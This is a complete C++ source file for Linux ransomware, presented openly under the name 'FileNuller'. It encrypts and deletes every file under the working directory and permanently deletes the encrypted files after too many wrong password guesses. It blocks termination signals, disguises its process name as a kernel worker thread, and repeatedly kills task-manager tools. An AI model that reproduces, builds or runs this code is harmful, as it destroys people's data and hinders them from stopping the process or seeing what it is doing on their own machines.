// Developed by Colton Silva 2025
// 
//
// WARNING: This single file contains c++ source code that
// can destroy Linux system by encrypting all files
// (including system files) and deleting them automatically
// if you enter incorrect password at it's given attempt times

// This software can alter or modify the system's operation
// which is, to block signals from preventing this from running


#include <iostream>
#include <fstream>
#include <cstring>
#include <vector>
#include <filesystem>
#include <thread>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/stat.h>
#include <unistd.h>
#include <chrono>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <map>
#include <csignal>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <atomic>
#include <string.h>

using namespace std;
namespace fs = std::filesystem;

const size_t CHUNK_SIZE = 16 * 1024;
const int AES_KEY_SIZE = 32;
const int AES_BLOCK_SIZE = 16;
const int SALT_SIZE = 16;
const char FILE_SIGNATURE[] = "SILVASYSTEMS\x01\x00";
const string MAP_FILE = "file_map.txt";

// Obfuscated password hidden inside garbage text
const string junk1 = "a1b2c3d4e5f6g7h8i9j0SuperX";
const string junk2 = "ZyXwVuTsRqPoNm";
const string junk3 = "vincemcmahon";
const string junk4 = "aBcDeFgHiJkLmNoPqRsTuVwXyZ";
const string junk5 = "1234567890!@#$%^&*()";
const string HARDCODED_PASSWORD = junk3;

// Password attempt limit
const int MAX_PASSWORD_ATTEMPTS = 50; // Change this value as needed

void generateSalt(unsigned char *salt) {
    RAND_bytes(salt, SALT_SIZE);
}

void deriveKey(const string &password, const unsigned char *salt, unsigned char *key, unsigned char *iv) {
    EVP_BytesToKey(EVP_aes_256_cbc(), EVP_sha256(), salt,
                   (unsigned char *)password.data(), password.size(), 1, key, iv);
}

void processFile(const string &inputFile, const string &outputFile, const string &password, bool encrypt, map<string, string> &fileMap) {
    ifstream inFile(inputFile, ios::binary);
    ofstream outFile(outputFile, ios::binary);

    if (!inFile || !outFile) {
        cerr << "Error opening file: " << inputFile << endl;
        return;
    }

    unsigned char salt[SALT_SIZE];
    unsigned char key[AES_KEY_SIZE], iv[AES_BLOCK_SIZE];

    if (encrypt) {
        generateSalt(salt);
        outFile.write(FILE_SIGNATURE, sizeof(FILE_SIGNATURE));
        outFile.write((char *)salt, SALT_SIZE);
        fileMap[outputFile] = inputFile;
    } else {
        char signature[sizeof(FILE_SIGNATURE)];
        inFile.read(signature, sizeof(FILE_SIGNATURE));
        if (strncmp(signature, FILE_SIGNATURE, sizeof(FILE_SIGNATURE)) != 0) {
            cerr << "Invalid file signature! Skipping " << inputFile << endl;
            return;
        }
        inFile.read((char *)salt, SALT_SIZE);
    }

    deriveKey(password, salt, key, iv);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv, encrypt);

    vector<unsigned char> buffer(CHUNK_SIZE);
    vector<unsigned char> outBuffer(CHUNK_SIZE + AES_BLOCK_SIZE);
    int outLen;

    while (inFile.read((char *)buffer.data(), CHUNK_SIZE) || inFile.gcount() > 0) {
        streamsize bytesRead = inFile.gcount();
        EVP_CipherUpdate(ctx, outBuffer.data(), &outLen, buffer.data(), bytesRead);
        outFile.write((char *)outBuffer.data(), outLen);
    }

    EVP_CipherFinal_ex(ctx, outBuffer.data(), &outLen);
    outFile.write((char *)outBuffer.data(), outLen);

    EVP_CIPHER_CTX_free(ctx);
    inFile.close();
    outFile.close();

   // cout << (encrypt ? "Nullfied" : "Restored") << ": " << inputFile << " -> " << outputFile << endl;

    fs::remove(inputFile);
}

void encryptDirectory(const fs::path &dirPath, map<string, string> &fileMap, int &counter) {
    const int MAX_THREADS = 4; // Limit concurrent threads
    vector<thread> threadPool;
    mutex mtx;
    atomic<int> activeThreads(0);
    condition_variable cv;

    vector<pair<string, string>> filesToEncrypt;

    for (const auto &entry : fs::recursive_directory_iterator(dirPath)) {
        if (entry.is_regular_file()) {
            string filePath = entry.path().string();
            string fileName = entry.path().filename().string();
            string relativePath = fs::relative(entry.path(), dirPath).string();

            if (fileName == "scramble.exe" || fileName == "scramble" || fileName == MAP_FILE) continue;
            if (fileName.size() > 4 && fileName.substr(0, 4) == "null") continue;

            string encryptedFile = "null" + to_string(counter++);
            filesToEncrypt.push_back({filePath, encryptedFile});
            fileMap[encryptedFile] = relativePath;
        }
    }

    for (auto &[filePath, encryptedFile] : filesToEncrypt) {
        unique_lock<mutex> lock(mtx);
        cv.wait(lock, [&] { return activeThreads < MAX_THREADS; });

        activeThreads++;
        threadPool.emplace_back([&, filePath, encryptedFile]() {
            processFile(filePath, encryptedFile, HARDCODED_PASSWORD, true, fileMap);
            {
                lock_guard<mutex> guard(mtx);
                activeThreads--;
            }
            cv.notify_all();
        });
    }

    // Wait for all threads to finish
    for (auto &t : threadPool) {
        if (t.joinable()) t.join();
    }
}

void encryptAllFiles() {
    map<string, string> fileMap;
    int counter = 1;
    encryptDirectory(fs::current_path(), fileMap, counter);
    ofstream mapFile(MAP_FILE, ios::binary);
    for (auto &pair : fileMap) {
        mapFile << pair.first << " " << std::quoted(pair.second) << endl;
}

    mapFile.close();
}

void decryptAllFiles() {
    ifstream mapFile(MAP_FILE, ios::binary);
    if (!mapFile) {
        cout << "No file map found! Cannot restore original names." << endl;
        return;
    }

    map<string, string> fileMap;
    string encFile, origFile;
   while (mapFile >> encFile >> std::quoted(origFile)) {
    fileMap[encFile] = origFile;
}

    mapFile.close();

    int attempts = 0;
    string userPassword;
    while (attempts < MAX_PASSWORD_ATTEMPTS) {
        cout << "Enter password to restore files: ";
        cin >> userPassword;
        if (userPassword == HARDCODED_PASSWORD) {
            for (auto &pair : fileMap) {
                fs::path outputPath = fs::current_path() / pair.second;
                if (!fs::exists(outputPath.parent_path())) {
                    fs::create_directories(outputPath.parent_path());
}
                processFile(pair.first, outputPath.string(), HARDCODED_PASSWORD, false, fileMap);
            }
            fs::remove(MAP_FILE);
            return;
        }
        cout << "Incorrect password. Attempts left: " << (MAX_PASSWORD_ATTEMPTS - attempts - 1) << endl;
        attempts++;
    }
    cout << "Max password attempts reached. Sorry but we need to delete these files.\n" << endl;
    for (auto &pair : fileMap) {
        fs::remove(pair.first);
    }
    fs::remove(MAP_FILE);
}

//Function to ignore termination signals
    void ignoreSignals(int signal) {
    cout << "\nInterrupt blocked. Process cannot be stopped!\n" << endl;
}

void startEncryption() {
    encryptAllFiles(); // Start encryption process
}

// Immortality
void signalHandler(int signum) {
    cout << "\n\033[1;31m[BLOCKED]\033[0m Attempted to terminate process! Ignored.\n" << endl;
}

void setupProtection() {
    signal(SIGHUP, signalHandler);     // Terminal hangup
    signal(SIGINT, signalHandler);     // Ctrl+C
    signal(SIGQUIT, signalHandler);    // Ctrl+\ //
    signal(SIGILL, signalHandler);     // Illegal instruction
    signal(SIGABRT, signalHandler);    // Abort signal
    signal(SIGFPE, signalHandler);     // Floating point exception
    signal(SIGSEGV, signalHandler);    // Segmentation fault
    signal(SIGPIPE, signalHandler);    // Broken pipe
    signal(SIGALRM, signalHandler);    // Timer signal
    signal(SIGTERM, signalHandler);    // Termination request
    signal(SIGUSR1, signalHandler);    // User-defined signal 1
    signal(SIGUSR2, signalHandler);    // User-defined signal 2
    signal(SIGTSTP, signalHandler);    // Ctrl+Z (suspend)
    signal(SIGTTIN, signalHandler);    // Background process read
    signal(SIGTTOU, signalHandler);    // Background process write
    signal(SIGXCPU, signalHandler);    // CPU time limit exceeded
    signal(SIGXFSZ, signalHandler);    // File size limit exceeded
    signal(SIGVTALRM, signalHandler);  // Virtual alarm
    signal(SIGPROF, signalHandler);    // Profiling timer expired
    prctl(PR_SET_NAME, "kworker/0:1H", 0, 0, 0);
}

// I decided to merge task managers and power session control in this function but these have the same goal, to prevent execution that may intterupt on this program

void monitorAndKillTaskManagers() {
    const vector<string> taskManagers = {
    //typical task manager
        "htop", "btop", "top", "atop", "gtop",
        "vtop", "bashtop", "glances", "ksysguard", "gnome-system-monitor",
        "xfce4-taskmanager", "lxtask", "taskmgr", "resmon", // cross-platform naming
        "kSysGuard", "mate-system-monitor", "nmon", "bpytop", "conky",
        "perf", "iotop", "ps_mem", "nmon"
  
    };

    while (true) {
        for (const auto &proc : taskManagers) {
        string cmd = "pkill -9 -f \"" + proc + "\" > /dev/null 2>&1";
            system(cmd.c_str());
        }
        this_thread::sleep_for(chrono::milliseconds(500));
    }
}

void encryptAllFiles();
void decryptAllFiles();

void watchdog() {
     pid_t pid = fork();
    // Run forever, checking if the program is running

     if (pid > 0) return;  // Parent process returns to continue encryption
    if (pid < 0) exit(1); // Fork failed

    while (true) {
        sleep(5); // Check every 5 seconds

        // Check if the program is running (excluding grep process itself)
        if (system("pgrep -f scramble | grep -v $$ > /dev/null") != 0) {
            system("./scramble &");  // Restart if not running
        }
    }
      exit(0); // Should never reach here, just a failsafe
}


int main() {

    if (!fs::exists(MAP_FILE)) {
      
    setupProtection();
    thread antiMonitor(monitorAndKillTaskManagers);
    antiMonitor.detach(); // Keeps it running in background


     //   signal(SIGINT, ignoreSignals);  // Prevents Ctrl+C
      //  signal(SIGTSTP, ignoreSignals); // Prevents Ctrl+Z
     //   signal(SIGKILL, ignoreSignals); // Prevents other termination signal
     //   signal(SIGSTOP, ignoreSignals);
    //    signal(SIGTERM, ignoreSignals);
       // daemonize();
        //setupProtection();
        //watchdog();

        cout << " _____ _ _      _   _       _ _\n|  ___(_) | ___| \\ | |_   _| | | ___ _ __ \n| |_  | | |/ _ \\  \\| | | | | | |/ _ \\ '__|\n|  _| | | |  __/ |\\  | |_| | | |  __/ |   \n|_|   |_|_|\\___|_| \\_|\\__,_|_|_|\\___|_|   \nThe not-so-bad RANSOMWARE for Linux by Colton Silva" << endl;

        cout << "\nOH NO! YOUR PERSONAL FILES WILL BE ENCRYPTED! Don't worry because this ransomware doesn't ask for money, stealing them or threaten you to distribute your sensitive files to criminals. You just need to solve this by guessing the correct password in order to retrieve them.\n\nYOU CAN'T DESTROY THIS PROCESS. EVEN IF YOU KILL YOUR LOVELY TERMINAL OF YOURS, THIS PROCESS IS ONGOING.\n" << endl;

        this_thread::sleep_for(chrono::seconds(10));

    // Start encryption immediately in a separate thread
        thread encryptionThread(startEncryption);

          cout << "Now, say BYE-BYE to your files!\n" << endl;

        this_thread::sleep_for(chrono::seconds(3));

        cout << "Null-ng files...\n" << endl;

    // Wait for encryption to complete
        encryptionThread.join();
        decryptAllFiles();
        return 0; 
    }

    else {
        decryptAllFiles();
    }
    return 0;
}
